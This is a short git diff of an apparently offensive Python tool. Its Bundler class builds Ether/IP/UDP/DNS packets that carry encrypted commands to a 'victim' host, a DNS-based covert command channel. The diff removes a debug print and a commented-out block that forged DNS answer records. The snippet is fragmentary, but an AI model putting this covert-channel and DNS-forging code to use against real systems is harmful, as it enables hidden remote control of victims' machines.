@@ -11,8 +11,7 @@ class Bundler():
         self.victim_id = victim_packet.getlayer(Ether).src
 
     def build_command_pkt(self, encrypted_comand):
-        p = self._build_ether() / self._build_ip() / self._build_udp()/ self._build_dns(encrypted_comand)
-        print(str(p))
+        p = self._build_ether() / self._build_ip() / self._build_udp() / self._build_dns(encrypted_comand)
         return p
     
     # TODO: Must break up large payload 
@@ -50,24 +49,3 @@ class Bundler():
                 rdata=payload # Update with payload
             )
         )
-
-        # dns_layer.qr = 1
-        # dns_layer.rd = 1
-        # dns_layer.ra = 1
-        # dns_layer.ancount = 1
-        # dns_layer.nscount = 0
-        # dns_layer.arcount = 0
-        # dns_layer.an = DNSRR(
-        #     rrname = dnsqr_layer.qname,
-        #     type = 'A',
-        #     rclass = 'IN',
-        #     ttl = 700,
-        #     rdlen = 4,
-        #     rdata = '172.217.6.202'
-        # )
-        # # dnsrr_layer.rdata = redirect
-        # # dns_layer.an = dnsrr_layer
-        # dns_layer.ns = None
-        # dns_layer.ar = None
-
-        # return dns_layer
